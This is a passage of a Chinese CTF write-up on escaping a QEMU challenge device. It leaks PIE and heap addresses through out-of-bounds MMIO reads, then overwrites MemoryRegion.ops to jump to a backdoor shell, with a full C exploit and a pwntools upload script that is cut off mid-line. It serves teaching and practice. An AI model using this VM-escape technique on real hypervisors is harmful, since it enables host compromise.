src="https://i0.imgs.ovh/2024/02/20/oNxdA.md.png"
alt="oNxdA.md.png" /></a></p>
<p>由于对 QEMU 不是很熟悉，我只能瞎命名，vn_mmio_write 的大体逻辑是</p>
<ul>
<li><p><code>object_dynamic_cast_assert</code>是动态类型转换，我OOP学的很烂所以不清楚这是什么😭，猜测是申请一块堆的地址然后用
ptr 指向这块地址</p></li>
<li><p>①如果 op == 0x30 且 ptr[737] == 0</p>
<ul>
<li>ptr[ ptr[736]/8 + 720 ] = var，并将 ptr[737] 设置为1</li>
</ul></li>
<li><p>②如果 op == 0x10 且 var &lt; 0x3C</p>
<ul>
<li>ptr[736] = var</li>
<li>这里可以用负数来上溢，从而可以读很大一片空间的内容</li>
</ul></li>
<li><p>③如果 op == 0x20 且 var 的高32位 &lt; 0x3C</p>
<ul>
<li>ptr[ HIDWORD(var) + 720 ] = (LODWORD)var</li>
</ul></li>
</ul>
<p>同理 vn_mmio_read 也可以分析出来。</p>
<p>通过分析我们可以得知，vn_mmio_write可以实现一些越界写，同理分析
vn_mmio_read
我们可以得知，令可以实现一些越界读，根据反汇编我们可以定制一下这道题的
mmio_read</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过 Shift + F12
查<code>/bin/sh</code>可以跟进到这道题的后门函数0x67429B，我们需要跳转到这里去执行execv("/bin/sh");</p>
<p>现在我们知道了怎样读写堆区，也知道写入什么东西。但我们不知道 ptr[736]
附近是不是 MemoryRegion，而且 QEMU 会启动 pie，我们需要绕过 pie
才能利用后门函数。</p>
<p>所以我们就先读一些内容，看看附近有没有什么能利用的东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> test_low,test_high,test;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">-1</span>;i&gt;=<span class="number">-30</span>;i--) &#123;</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span>);</span><br><span class="line">        test_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">        test_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        test = test_low + (test_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test%d = 0x%llx\n&quot;</span>, -i, test);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/usr/bin # ./exp</span></span><br><span class="line"><span class="comment">mmio_base Resource0Base: 0x7fafa8025000</span></span><br><span class="line"><span class="comment">test1 = 0x0</span></span><br><span class="line"><span class="comment">test2 = 0x0</span></span><br><span class="line"><span class="comment">test3 = 0x0</span></span><br><span class="line"><span class="comment">test4 = 0x0</span></span><br><span class="line"><span class="comment">test5 = 0x55da28130f00</span></span><br><span class="line"><span class="comment">test6 = 0x55da2812ef78</span></span><br><span class="line"><span class="comment">test7 = 0x0</span></span><br><span class="line"><span class="comment">test8 = 0x55da271feb98</span></span><br><span class="line"><span class="comment">test9 = 0x55da27e4f820</span></span><br><span class="line"><span class="comment">test10 = 0x55da2812ef58</span></span><br><span class="line"><span class="comment">test11 = 0x0</span></span><br><span class="line"><span class="comment">test12 = 0x1</span></span><br><span class="line"><span class="comment">test13 = 0x0</span></span><br><span class="line"><span class="comment">test14 = 0x0</span></span><br><span class="line"><span class="comment">test15 = 0x10001</span></span><br><span class="line"><span class="comment">test16 = 0x0</span></span><br><span class="line"><span class="comment">test17 = 0x55da256a335b // -&gt; memory_region_destructor_none</span></span><br><span class="line"><span class="comment">test18 = 0xfebf1000</span></span><br><span class="line"><span class="comment">test19 = 0x0</span></span><br><span class="line"><span class="comment">test20 = 0x1000</span></span><br><span class="line"><span class="comment">test21 = 0x0</span></span><br><span class="line"><span class="comment">test22 = 0x55da271feae0</span></span><br><span class="line"><span class="comment">test23 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test24 = 0x55da25dd01e0 // -&gt; vn_mmio_ops</span></span><br><span class="line"><span class="comment">test25 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test26 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test27 = 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>我们逐个地址 <code>x/2gx</code>
一下，最终发现这几个比较有意思的地方</p>
<blockquote>
<p>PIE</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da256a335b</span></span><br><span class="line"><span class="number">0x55da256a335b</span> &lt;memory_region_destructor_none&gt;: <span class="number">0xe5894855fa1e0ff3</span>      <span class="number">0xf3c35d90f87d8948</span></span><br></pre></td></tr></table></figure>
<p>我们在 IDA 中是能搜到这个函数的，它在 QEMU 里的偏移量是
0x82B35B，通过这个我们就可以计算出 docker 加载 QEMU 时的基地址了</p>
<blockquote>
<p>heap &amp; MemoryRegion</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da25dd01e0</span> &lt;vn_mmio_ops&gt;:   <span class="number">0x000055da252d3458</span>      <span class="number">0x000055da252d3502</span></span><br></pre></td></tr></table></figure>
<p>我们找到了需要的 ops，test24 存的就是 0x55da25dd01e0</p>
<p>所以我们有如下对应关系： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ptr[<span class="number">-24</span> + <span class="number">720</span>] -&gt; <span class="number">0x55da25dd01e0</span></span><br></pre></td></tr></table></figure></p>
<p>那很自然的我们就想到，ptr的其他地方存着什么？这附近是不是就是
MemoryRegion？可是我们并没有 (&amp;ptr[-24 + 720])，但我们知道的是
MemoryRegion 存在堆里，所以我们考虑用 find
命令查找（看起来像堆地址的）堆地址附近查找 0x55da25dd01e0 这个值就行</p>
<p>最终我们用到的是 test23 -&gt; 0x55da2812e470</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查找 [0x55da2812e470,0x55da2812e470+0x1000] 中存放0x55da25dd01e0的地址</span></span><br><span class="line">(gdb) find <span class="number">0x55da2812e470</span>, <span class="number">0x55da2812e470</span>+<span class="number">0x1000</span>, <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da2812eef0</span></span><br><span class="line"><span class="number">1</span> pattern found.</span><br></pre></td></tr></table></figure>
<p>因此我们知道 0x55da2812eef0 存放着我们需要的 0x55da25dd01e0</p>
<p>观察发现这个地址跟我们的 test10 非常近，可以计算一下
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) print(<span class="number">0x55da2812ef58</span> - <span class="number">0x55da2812eef0</span>)</span><br><span class="line">$<span class="number">1</span> = <span class="number">104</span></span><br><span class="line"><span class="comment">// 104 = 0x68</span></span><br><span class="line"><span class="comment">// 所以 test23 = 0x55da2812eef0 =  0x55da2812ef58 - 0x68 = test10 - 0x68</span></span><br></pre></td></tr></table></figure></p>
<p>而我们打印一下更多附近的值，可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">52</span>xg <span class="number">0x55da2812ef58</span> - <span class="number">0x58</span> - <span class="number">0x60</span></span><br><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span>      <span class="number">0x000055da2812e470</span> &lt;- test <span class="number">24</span> | <span class="number">23</span></span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span>      <span class="number">0x000055da256a335b</span> &lt;- test <span class="number">18</span> | <span class="number">17</span></span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x000055da2812ef58</span>      <span class="number">0x000055da27e4f820</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x000055da271feb98</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x000055da2812ef78</span>      <span class="number">0x000055da28130f00</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span> &lt;- test <span class="number">0</span> | <span class="number">-1</span></span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eff0</span>: <span class="number">0x00000000ffffff2c</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812f000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x55da2812f010</span>: <span class="number">0x000055da2812d3c0</span>      <span class="number">0x000055da273b01d0</span></span><br><span class="line"><span class="number">0x55da2812f020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725d5f</span></span><br><span class="line"><span class="number">0x55da2812f030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725de1</span></span><br></pre></td></tr></table></figure>
<p>我们回到 <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">ctf-wiki-QEMU</a>
里查看一下 MemoryRegion</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// 指向父 MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// 内存区域大小</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// 在父 MR 中的偏移量</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// 仅在 alias MR 中，指向实际的 MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>假设我们把 test24 看作上面结构体的 const MemoryRegionOps *ops;
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span></span><br><span class="line"><span class="number">0x55da2812eea8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span></span><br><span class="line"><span class="number">0x55da2812eeb8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eec8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eed8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eee8</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span> <span class="number">-24</span> -&gt; test24 -&gt; ops</span><br><span class="line"><span class="number">0x55da2812eef8</span>: <span class="number">0x000055da2812e470</span> <span class="number">-23</span> -&gt; test23 -&gt; opaque</span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span> <span class="number">-22</span> -&gt; test22 -&gt; container</span><br><span class="line"><span class="number">0x55da2812ef08</span>: <span class="number">0x0000000000000000</span> <span class="number">-21</span> -&gt; test21 -&gt; 这里不知道是什么😭</span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span> <span class="number">-20</span> -&gt; test20 -&gt; size(Int128)</span><br><span class="line"><span class="number">0x55da2812ef18</span>: <span class="number">0x0000000000000000</span> <span class="number">-19</span> -&gt; test19 -&gt; size</span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span> <span class="number">-18</span> -&gt; test18 -&gt; addr</span><br><span class="line"><span class="number">0x55da2812ef28</span>: <span class="number">0x000055da256a335b</span> <span class="number">-17</span> -&gt; test17 -&gt; mr</span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef38</span>: <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef48</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812ef58</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef68</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef78</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef88</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef98</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa8</span>: <span class="number">0x0000000000000000</span> -&gt; test0 </span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span> -&gt; 可以看到这里有一大片<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="number">0x55da2812efb8</span>: <span class="number">0x0000000000000000</span> -&gt; 我们可以把控制流劫持的指针</span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span> -&gt; 放在这一片</span><br><span class="line"><span class="number">0x55da2812efc8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe8</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>我们可以看到这就是 MemoryRegion，当我们修改 ptr[-24 + 720] 即
MemoryRegion.ops 的值为 0x55da2812efb8(&amp;test0 + 8)，我们就可以在执行
vn_mmio_read 和 vn_mmio_write 时去执行 0x55da2812efb8 指向的函数</p>
<p>所以我们考虑这样的布置： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eef0</span>(&amp;test24)   -&gt; <span class="number">0x55da2812efd8</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>(&amp;backdoor) -&gt; <span class="number">0x55da2812efd0</span> -&gt; 后门函数<span class="number">0x67429B</span></span><br></pre></td></tr></table></figure></p>
<p>完整 exp <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define MAP_SIZE 4096UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_base;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">getMMIOBase</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = open(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_base = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_base == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie = pie_low + (pie_high &lt;&lt; <span class="number">32</span>) - <span class="number">0x82B35B</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pie = 0x%llx\n&quot;</span>, pie);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap = heap_low + (heap_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap = 0x%llx\n&quot;</span>, heap);</span><br><span class="line">    <span class="type">uint64_t</span> backdoor = pie + <span class="number">0x67429B</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_plt_addr = heap + <span class="number">0x60</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">uint64_t</span> cmdaddr = heap + <span class="number">0x58</span> + <span class="number">8</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write_idx(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">12</span>,<span class="number">0x67616C66</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">16</span>,backdoor &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">20</span>,backdoor &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">24</span>,system_plt_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">28</span>,system_plt_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">32</span>,cmdaddr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">36</span>,cmdaddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">40</span>;i &lt;= <span class="number">60</span> ;i += <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mmio_write_idx(i,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">-0xc0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x30</span>,system_plt_addr);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_read(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如何传到远端服务器？</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span 